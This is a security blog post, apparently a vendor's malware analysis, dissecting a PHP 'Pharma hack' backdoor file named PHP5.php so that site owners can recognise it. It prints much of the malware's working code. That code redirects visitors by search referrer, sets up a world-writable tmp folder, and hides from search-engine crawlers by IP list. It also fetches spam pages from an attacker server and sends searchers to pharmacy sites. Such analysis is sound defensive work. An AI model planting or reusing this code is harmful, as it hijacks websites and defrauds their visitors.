@@ -1,0 +1,189 @@
+Pharma Hack Backdoor Analyzed – PHP5.PHP
+
+Some of you might remember my last Pharma hack post, Intelligent (Pharma) SPAM Decoded, today I will spend some time looking a different variant of the same infection type but focus on a payload that is not encoded or embedded within an existing file, instead it resides in its own file – PHP5.php.
+“Hmm, maybe it’s a good / system file, it does have PHP in it, I won’t bother looking at it…”
+If you have ever come across this file and find yourself thinking this, we highly encourage you not to and take a minute to see if any of its components resemble what we’re about to share.
+Dissecting the Payload
+
+1. Online Store
+The first thing that pops out when looking at the code is the introduction of the online store. The following snippet creates an array with different product names and terms.
+Depending on the $_SERVER[“HTTP_REFERER”] and the term used the malware redirects the USER to an online store which is likely being controlled by the attacker to generate revenue – an example of an monetized attack.
+
+<?php
+$keyspat = array(
+‘adobe creative suite 5.5 master collection’,
+‘microsoft windows 7 ultimate’,
+‘microsoft office 2010 professional plus’,
+‘adobe acrobat x pro’,
+…
+‘microsoft’,
+‘soft’ => ‘adobe’,
+‘cheap’ => ‘adobe’,
+‘price’ => ‘adobe’,
+‘order’ => ‘adobe’,
+‘sale’ => ‘adobe’,
+‘buy’ => ‘adobe’,
+‘professional’ => ‘adobe’,
+‘system’ => ‘adobe’,
+);
+$rfrr = urldecode($_SERVER[“HTTP_REFERER”]);
+foreach ($keyspat as $k => $v)
+{
+if (is_int($k))
+{
+if (stripos($rfrr,$v))
+{
+header(“Location:       http://outlet-programs.net/browse/search/?q=”.$v);
+exit;
+}
+}
+else
+{
+if (stripos($rfrr,$k))
+{
+header(“Location:       http://outlet-programs.net/browse/search/?q=”.$v);
+exit;
+}
+}
+}
+?&rt
+
+2. Home Sweet Home
+The next thing you notice is the creation of its own little home away from home on the targets environment, how cute…
+
+<?php
+$adm_url        = ‘http://tdsinto.net/big/gtxt.php?pg=’;
+$page_upd_time  = 60*60*24;//1 day
+$empty_upd_time = 60*60*24*10;//10 days
+error_reporting(0);
+if (isset($_POST[‘test_mode’]) && $_POST[‘test_mode’]==1)
+{
+if (!is_dir(‘tmp’))
+{
+$res = mkdir(‘tmp’);
+if ($res===false) {exit(‘Folder create error’);}
+@chmod(‘tmp’,0777);
+}
+@file_put_contents(‘tmp/1′,’123’);
+if (!is_file(‘tmp/1’)) {exit(‘File create error’);}
+@unlink(‘tmp/1’);
+exit(‘All ok’);
+}
+
+If specific conditions are met via a $_POST variable (test_mode), the attacker can set up the environment to host their SPAM.
+From the snippet above you can see the script checking that the tmp directory exists on the server, if it doesn’t it creates it and sets its permissions to 777 (read, write, execute to owner, group and others). It then verifies full control of the directory by creating a file inside the directory for further use.
+I like that, its own built-in unit testing, how nice. It’s good to see that even the developers with malicious intent follow good SDLC best practice.
+3. Avoiding Automatic Detection (Crawlers)
+The following snippet is a very clever in its intent.
+
+$stop_ips_masks = array(
+“66.249.[6-9][0-9].[0-9]+”,    // Google    NetRange:   66.249.64.0 – 66.249.95.255
+“74.125.[0-9]+.[0-9]+”,        // Google     NetRange:   74.125.0.0 – 74.125.255.255
+“65.5[2-5].[0-9]+.[0-9]+”,    // MSN        NetRange:   65.52.0.0 – 65.55.255.255,
+“74.6.[0-9]+.[0-9]+”,        // Yahoo    NetRange:   74.6.0.0 – 74.6.255.255
+“67.195.[0-9]+.[0-9]+”,        // Yahoo#2    NetRange:   67.195.0.0 – 67.195.255.255
+“72.30.[0-9]+.[0-9]+”,        // Yahoo#3    NetRange:   72.30.0.0 – 72.30.255.255
+“38.[0-9]+.[0-9]+.[0-9]+”,     // Cuill:     NetRange:   38.0.0.0 – 38.255.255.255
+“93.172.94.227”,                // MacFinder
+“212.100.250.218”,            // Wells Search II
+“71.165.223.134”,            // Indy Library
+“70.91.180.25”,
+“65.93.62.242”, “74.193.246.129”, “213.144.15.38”, “195.92.229.2”, …
+“165.160.2.20”, “89.122.224.230”, “66.230.175.124”, “218.18.174.27”, …
+…..
+“91.187.103.152”,
+“208.80.74.7”,
+“207.164.79.6”,
+“89.149.253.169”);
+…
+
+In it, the attacker tries to avoid being detected and blocked by web crawlers. Again, you can see a fairly significant range of IP’s, next to them you also see that the attacker was generous enough to tell us which IP’s belong to who.
+4. Cherry on Top
+And as the grand finale, you’ll find the code that actually downloads the payload to the environment to begin distribution.
+The malware is downloaded to the tmp directory using a number of encoded(md5) files, each with SPAM injected within the files. Inside you will find the URL with the content being declared in the $adm_url. It also recognizes the importance of staying updated and checks to make sure it is, if its not, it updates itself.
+Finally, it uses keywords as a condition, if the conditions are met, then it redirects the visitors to Canadian Pharma medication.
+
+$our_page       = strtolower(‘http://’.str_replace(‘www.’,”,$_SERVER[‘HTTP_HOST’])…
+$request_md5    = md5(strtolower($_SERVER[‘REQUEST_URI’]));
+if (!is_file(‘tmp/’.$request_md5))
+{
+if (is_dir(‘tmp/’))
+{
+file_put_contents(‘tmp/’.$request_md5,gpvvv3($adm_url.urlencode($our_page)));
+clearstatcache();
+}
+}
+if (is_file(‘tmp/’.$request_md5))
+{
+$f_time = time() – filemtime($file_tmp_name);
+if (filesize(‘tmp/’.$request_md5)==0)
+{
+if ($f_time > $empty_upd_time)
+{
+file_put_contents(‘tmp/’.$request_md5,gpvvv3($adm_url.urlencode($our_page)));
+}
+return ;
+}
+if ($f_time > $page_upd_time)
+{
+$cnttt = gpvvv3($adm_url.urlencode($our_page));
+file_put_contents(‘tmp/’.$request_md5,$cnttt);
+if (empty($cnttt)) {return ;}
+unset($cnttt);
+}
+$is_bot = FALSE ;
+foreach ( $stop_ips_masks as $k=>$v )
+{
+if (preg_match( ‘#^’.$v.’$#’, $_SERVER[‘REMOTE_ADDR’])){	$is_bot = TRUE ;break;}
+}
+if ($is_bot === true) {echo file_get_contents(‘tmp/’.$request_md5); exit;}
+$xxx = preg_replace( $user_agent_to_filter, ‘-NO-WAY-‘, $_SERVER[‘HTTP_USER_AGENT’] );
+if( strpos( $xxx, ‘-NO-WAY-‘ ) !==  FALSE) {echo file_get_contents(‘tmp/’.$request_md5); exit;}
+if (!empty($_SERVER[‘HTTP_USER_AGENT’]))
+{
+if ( preg_match ( ‘#google|msn|bing|live|altavista|ask|yahoo|aol#i’, $_SERVER[‘HTTP_REFERER’] ) )
+{
+if ( preg_match( ‘#[&?][pq]=([^&]+)#i’, $_SERVER[‘HTTP_REFERER’] , $match ) )
+{
+$keyword = $match[1] ;
+if ( preg_match (‘/accutane|ACCUTANE|Accutane/i’,$keyword))
+{
+echo <<
+if (document.referrer.toLowerCase().indexOf(‘viagra’)!=-1) location.href=’http://canadian-discount-meds.com/?aid=1751&said=ed’;
+if (document.referrer.toLowerCase().indexOf(‘Viagra’)!=-1) location.href=’http://canadian-discount-meds.com/?aid=1751&said=ed’;
+if (document.referrer.toLowerCase().indexOf(‘Cialis’)!=-1) location.href=’http://canadian-discount-meds.com/?aid=1751&said=ed’;
+if (document.referrer.toLowerCase().indexOf(‘cialis’)!=-1) location.href=’http://canadian-discount-meds.com/?aid=1751&said=ed’;
+if (document.referrer.toLowerCase().indexOf(‘Levitra’)!=-1) location.href=’http://canadian-discount-meds.com/?aid=1751&said=ed’;
+if (document.referrer.toLowerCase().indexOf(‘levitra’)!=-1) location.href=’http://canadian-discount-meds.com/?aid=1751&said=ed’;
+if (document.referrer.toLowerCase().indexOf(‘tadalafil’)!=-1) location.href=’http://canadian-discount-meds.com/?aid=1751&said=ed’;
+if (document.referrer.toLowerCase().indexOf(‘Tadalafil’)!=-1) location.href=’http://canadian-discount-meds.com/?aid=1751&said=ed’;
+if (document.referrer.toLowerCase().indexOf(‘pharmacy’)!=-1) location.href=’http://canadian-discount-meds.com/?aid=1751&said=ed’;
+
+HTML;
+exit;
+}
+}
+}
+}
+}
+function gpvvv3($url)
+{
+if (function_exists(‘curl_init’))
+{
+$ch = curl_init();
+curl_setopt($ch, 13, 10);
+curl_setopt($ch, 10002, $url);
+curl_setopt($ch, 19913, true);
+$some_content = curl_exec($ch);
+curl_close($ch);
+}
+else
+{
+$some_content = file_get_contents($url);
+}
+return $some_content;
+}
+
+As you can see the Pharma hack continues to evolve, its not just a matter of injecting a site with links to viagra, the entire game has changed. From the validation of permissions, to the encoding of payloads, to the conditional nature of displays; it certainly a level of sophistication that warrants a little bit of respect and appreciation.
+
+If you have any questions let us know at info@sucuri.net
